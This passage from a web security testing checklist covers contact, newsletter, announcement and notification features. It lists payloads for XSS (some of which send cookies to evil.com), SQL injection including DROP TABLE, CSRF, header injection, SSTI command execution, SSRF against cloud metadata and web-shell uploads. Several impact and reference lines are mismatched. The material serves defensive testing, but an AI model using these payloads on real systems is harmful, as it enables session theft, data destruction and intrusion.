**Expected Result:** Application must sanitize all contact form inputs and encode output when rendering submissions in admin panel or email.

**Payload Example:**

```
name=<script>alert(document.cookie)</script>;subject=<img src=x onerror=alert(1)>;message=<svg/onload=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-108 — Contact Form SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with SQL injection payloads in all text fields. 2. Observe responses for SQL errors. 3. Test both blind and error-based injection.

**Expected Result:** Application must use parameterized queries for storing and processing contact form submissions.

**Payload Example:**

```
name=' OR 1=1--;email=test@test.com' UNION SELECT password FROM users--;message='; DROP TABLE contacts;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-109 — Contact Form CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Craft a malicious page that auto-submits the contact form on behalf of the victim. 2. Pre-fill with attacker's message content. 3. Lure victim to visit. 4. Check if form is submitted.

**Expected Result:** Application must implement CSRF protection on the contact form even for unauthenticated submissions.

**Payload Example:**

```
<form action='https://target.com/api/contact' method='POST'><input name='name' value='Victim'><input name='message' value='Spam'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-110 — Contact Form Email Header Injection
**Test Category:** Injection (WSTG-INPV-11) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with CRLF injection in the email field. 2. Inject additional email headers. 3. Check if the form is used as a mail relay to send spam.

**Expected Result:** Application must sanitize the email field and prevent any header injection in the contact form email processing.

**Payload Example:**

```
email=user@test.com%0d%0aCc:spam1@test.com%0d%0aBcc:spam2@test.com;email=user@test.com\r\nSubject:Spam
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;SMTP Tester

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## COMM-111 — Contact Form Rate Limiting Bypass
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form rapidly many times. 2. Check for rate limiting or CAPTCHA. 3. Attempt to bypass rate limits using header manipulation or distributed requests.

**Expected Result:** Application must implement rate limiting and CAPTCHA on the contact form to prevent spam and abuse.

**Payload Example:**

```
Send 500+ POST /api/contact submissions;bypass rate limit with X-Forwarded-For header rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-112 — Contact Form File Upload Vulnerability
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. If the contact form allows file attachments upload malicious files. 2. Test with web shells and executable files. 3. Check file type and content validation. 4. Try to access uploaded files.

**Expected Result:** Application must validate file type by content inspection and scan for malware and store uploads securely outside web root.

**Payload Example:**

```
Upload shell.php.jpg;test.html;malware.exe.doc;polyglot file with PHP code inside JPEG header
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## COMM-113 — Contact Form CAPTCHA Bypass
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Identify the CAPTCHA implementation on the contact form. 2. Test for CAPTCHA bypass techniques like reusing tokens or using OCR. 3. Check if CAPTCHA validation is server-side.

**Expected Result:** Application must implement robust CAPTCHA with server-side validation that prevents automated submissions.

**Payload Example:**

```
Reuse CAPTCHA token;remove CAPTCHA parameter from request;use OCR tools;test with empty CAPTCHA value
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Tesseract OCR;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-114 — Sensitive Data Exposure in Contact Form Responses
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with various invalid inputs. 2. Check error responses for verbose information. 3. Look for stack traces or database details or internal paths.

**Expected Result:** Application must return generic error messages for contact form validation failures without exposing internal system details.

**Payload Example:**

```
Submit malformed data and check for stack traces;database connection strings;file paths;framework versions
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-115 — SSTI in Contact Form Auto-Reply
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with template syntax in the name or message field. 2. If an auto-reply email is sent check if template expressions are evaluated. 3. Look for computed values.

**Expected Result:** Application must escape template syntax in user input before including in auto-reply email templates.

**Payload Example:**

```
name={{7*7}};message=${T(java.lang.Runtime).getRuntime().exec('id')};subject={{config.items()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap;Email Client

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COMM-116 — Contact Form Stored XSS in Admin Panel
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Contact Form

**Test Steps:** 1. Submit the contact form with persistent XSS payloads targeting the admin panel. 2. Wait for admin to view submissions. 3. Verify if the payload executes in admin context with higher privileges.

**Expected Result:** Application must encode all contact form data when rendering in the admin panel to prevent privilege escalation via stored XSS.

**Payload Example:**

```
message=<script>fetch('https://evil.com/admin-steal?cookie='+document.cookie+'&url='+location.href)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-117 — Newsletter Subscription Without Email Verification
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Subscribe to the newsletter with an arbitrary email address. 2. Check if the subscription is activated without email verification. 3. Test if unwanted subscriptions can be forced on others.

**Expected Result:** Application must implement double opt-in requiring email verification before activating newsletter subscriptions.

**Payload Example:**

```
POST /api/newsletter/subscribe with email=victim@company.com without any verification step
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-118 — Newsletter Subscription SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Use the newsletter subscription form. 2. Inject SQL payloads in the email field. 3. Observe responses for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for newsletter subscription operations.

**Payload Example:**

```
email=' OR 1=1--;email=test@test.com' UNION SELECT group_concat(email) FROM subscribers--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-119 — Newsletter Email Bombing
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Subscribe a victim's email to the newsletter. 2. Trigger multiple subscription confirmation emails. 3. Check for rate limiting. 4. Attempt mass subscription with the same email.

**Expected Result:** Application must implement rate limiting on subscription confirmation emails and prevent repeated subscription attempts for the same email.

**Payload Example:**

```
Send 1000+ POST /api/newsletter/subscribe with same victim email;script automated subscribe/unsubscribe cycles
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COMM-120 — Newsletter Subscriber List Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Check if the subscription status check endpoint reveals whether an email is subscribed. 2. Enumerate email addresses against the subscription check. 3. Build subscriber list.

**Expected Result:** Application must not reveal subscription status for arbitrary email addresses to prevent subscriber enumeration.

**Payload Example:**

```
GET /api/newsletter/status?email=test1@test.com through test10000@test.com and note different responses
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COMM-121 — Newsletter Unsubscribe IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Unsubscribe from the newsletter using the provided link. 2. Modify the subscriber identifier in the URL. 3. Check if other users can be unsubscribed without their consent.

**Expected Result:** Application must use signed or tokenized unsubscribe links that prevent manipulation to unsubscribe other users.

**Payload Example:**

```
Change /newsletter/unsubscribe?id=SUB-1001 to id=SUB-1002;modify email parameter to victim@test.com
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-122 — Newsletter XSS via Email Field
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Enter XSS payload in the newsletter email subscription field. 2. Submit and check if the payload is reflected on the page or stored in admin subscriber list. 3. Check for execution.

**Expected Result:** Application must validate email format and sanitize all input to prevent XSS through subscription forms.

**Payload Example:**

```
email="><script>alert(1)</script>@test.com;email=test+<img/src=x onerror=alert(1)>@test.com
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-123 — Newsletter CSRF Subscription
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Craft a malicious page that auto-subscribes the victim's email to newsletters. 2. Lure victim to visit. 3. Check if subscription occurs without explicit consent.

**Expected Result:** Application must implement CSRF protection or require explicit confirmation for newsletter subscriptions.

**Payload Example:**

```
<img src='https://target.com/api/newsletter/subscribe?email=victim@test.com'>;auto-submit form
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-124 — Newsletter Data Export Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Newsletter Subscription

**Test Steps:** 1. Check for newsletter subscriber export endpoints. 2. Attempt to export subscriber data with regular user credentials. 3. Look for admin export functionality.

**Expected Result:** Application must restrict subscriber data export to authorized admin users only.

**Payload Example:**

```
GET /api/newsletter/subscribers/export;GET /api/admin/newsletter/export with regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-125 — Unauthorized Announcement Creation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. As a regular user attempt to create a system announcement or broadcast. 2. Access admin announcement endpoints. 3. Check if role-based access control is enforced.

**Expected Result:** Application must restrict announcement and broadcast creation to authorized admin roles only.

**Payload Example:**

```
POST /api/announcements/create with regular user credentials;POST /api/broadcasts/send with non-admin token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-126 — XSS in Announcement Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. If announcement creation is accessible inject XSS payloads in the announcement title and body. 2. Submit the announcement. 3. Check if XSS executes for all users viewing the announcement.

**Expected Result:** Application must sanitize announcement content on input and encode on output to prevent stored XSS affecting all users.

**Payload Example:**

```
title=<script>alert(document.cookie)</script>;body=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>;content=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-127 — Announcement SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Search or filter announcements. 2. Inject SQL payloads in search parameters. 3. If announcement creation is possible inject in title or body fields.

**Expected Result:** Application must use parameterized queries for all announcement-related database operations.

**Payload Example:**

```
GET /api/announcements?search=' OR 1=1--;title=Test' UNION SELECT password FROM admins--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-128 — Broadcast Message Spoofing
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Intercept a broadcast message request. 2. Modify the sender or author field to impersonate an admin or system. 3. Check if the spoofed broadcast appears as if from the impersonated user.

**Expected Result:** Application must determine broadcast sender from the authenticated admin session and not accept client-provided sender information.

**Payload Example:**

```
Change author=regular_user to author=system_admin or sender_name=CEO in broadcast request
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-129 — Announcement Targeting Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. If announcements can target specific user groups intercept the request. 2. Modify the target audience to include unauthorized groups. 3. Check if targeting restrictions are enforced.

**Expected Result:** Application must validate announcement targeting against authorized groups and prevent unauthorized audience expansion.

**Payload Example:**

```
Change target_group=support_team to target_group=all_users or target_group=admin_team
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-130 — Announcement CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Craft a malicious page that auto-submits an announcement creation request using admin's session. 2. Lure admin to visit. 3. Check if a rogue announcement is published.

**Expected Result:** Application must validate CSRF tokens on all announcement creation and broadcast endpoints.

**Payload Example:**

```
<form action='https://target.com/api/announcements/create' method='POST'><input name='title' value='System Down'><input name='body' value='All data lost'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-131 — Announcement Deletion IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Delete own announcement or draft. 2. Intercept and change announcement_id to another announcement. 3. Check if unauthorized deletion occurs.

**Expected Result:** Application must verify that the user has permission to delete the specific announcement before processing the deletion.

**Payload Example:**

```
DELETE /api/announcements/ANN-2001 with non-author admin credentials;DELETE with regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-132 — Broadcast Priority Escalation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Create an announcement with normal priority. 2. Intercept and modify priority to critical or emergency. 3. Check if priority escalation bypasses approval workflows.

**Expected Result:** Application must enforce priority-level authorization and require additional approval for high-priority broadcasts.

**Payload Example:**

```
Change priority=normal to priority=critical or priority=emergency in announcement creation request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-133 — HTML Injection in Broadcast Messages
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Inject HTML content in broadcast messages. 2. Include phishing links or misleading UI elements. 3. Submit and check if HTML renders for all recipients.

**Expected Result:** Application must sanitize HTML in broadcast messages to prevent content injection and phishing.

**Payload Example:**

```
body=<h1 style='color:red'>URGENT: Your account is suspended</h1><a href='https://evil.com'>Verify Now</a>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-134 — Announcement Scheduling Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Announcement / Broadcast

**Test Steps:** 1. Schedule an announcement for future publication. 2. Intercept and change the scheduled time to immediate or past time. 3. Check if the announcement publishes instantly bypassing review.

**Expected Result:** Application must validate scheduled times server-side and enforce any review or approval processes regardless of scheduling.

**Payload Example:**

```
Change scheduled_at=2025-12-25T00:00:00Z to scheduled_at=2020-01-01T00:00:00Z or scheduled_at=now
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-135 — Email Notification SSRF via Dynamic Content
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. If email notifications fetch remote content like images or tracking pixels check for SSRF. 2. Inject internal URLs in fields that become image sources in emails. 3. Check if the server fetches internal resources.

**Expected Result:** Application must validate and whitelist all URLs fetched for email content rendering blocking internal network access.

**Payload Example:**

```
profile_image_url=http://169.254.169.254/latest/meta-data/;company_logo=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## COMM-136 — Email Notification Delivery Status Information Leak
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Email Notifications

**Test Steps:** 1. Trigger email notifications to invalid addresses. 2. Check if bounce notifications or delivery status reports expose internal mail server configuration. 3. Review SMTP headers in received emails.

**Expected Result:** Application must not expose internal SMTP server details in bounce notifications or email headers visible to end users.

**Payload Example:**

```
Check email headers for X-Originating-IP;internal mail server names;software versions;internal routing paths
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Email Client;SMTP Tools;MXToolbox

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-137 — SMS Unicode Exploitation
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Send SMS notification trigger with Unicode characters. 2. Check if Unicode characters cause SMS truncation or splitting revealing partial sensitive data. 3. Test for GSM encoding issues.

**Expected Result:** Application must handle Unicode properly in SMS and avoid sending sensitive data that could be split across multiple SMS segments.

**Payload Example:**

```
Inject Unicode characters like emojis before sensitive content to force SMS splitting at sensitive data boundaries
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## COMM-138 — SMS Delivery Report IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SMS Notifications

**Test Steps:** 1. Check delivery status of own SMS notification. 2. Change the message_id or reference to another user's SMS. 3. Check if delivery status for other users' SMS is accessible.

**Expected Result:** Application must verify ownership before displaying SMS delivery status information.

**Payload Example:**

```
GET /api/sms/delivery-status/MSG-2001 with non-owner credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-139 — Push Notification Topic Hijacking
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. If push notifications use topic-based subscription subscribe to admin or system topics. 2. Check if unauthorized topic subscriptions receive privileged notifications.

**Expected Result:** Application must enforce authorization on topic subscriptions and prevent users from subscribing to privileged notification topics.

**Payload Example:**

```
POST /api/push/subscribe-topic with topic=admin_alerts or topic=system_debug or topic=internal_monitoring
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-140 — Push Notification Payload Size Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Push Notifications

**Test Steps:** 1. If push notification content is user-influenced create extremely large payloads. 2. Check for size limits. 3. Monitor for resource exhaustion or denial of service.

**Expected Result:** Application must enforce payload size limits on push notifications and reject oversized content.

**Payload Example:**

```
Trigger push notification containing 1MB+ of data in notification body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## COMM-141 — In-App Notification Link Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. If notifications contain action links check if the link URL can be controlled. 2. Inject javascript: or data: URIs. 3. Check for open redirect via notification links.

**Expected Result:** Application must validate all notification action URLs against a whitelist of allowed schemes and domains.

**Payload Example:**

```
action_url=javascript:alert(document.cookie);action_link=data:text/html,<script>alert(1)</script>;next_url=//evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-142 — In-App Notification Persistence After Account Deletion
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** In-App Notifications

**Test Steps:** 1. Create notifications referencing user-generated content. 2. Delete the user account. 3. Check if notification data persists and is accessible to other users after account deletion.

**Expected Result:** Application must properly handle notification data cleanup when referenced accounts are deleted to prevent data leakage.

**Payload Example:**

```
Delete account and check if notifications referencing deleted user's data still display personal information
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite;Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## COMM-143 — WebSocket Connection Limit Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Open many simultaneous WebSocket connections from a single account. 2. Check for connection limits per user. 3. Attempt to exhaust server WebSocket capacity.

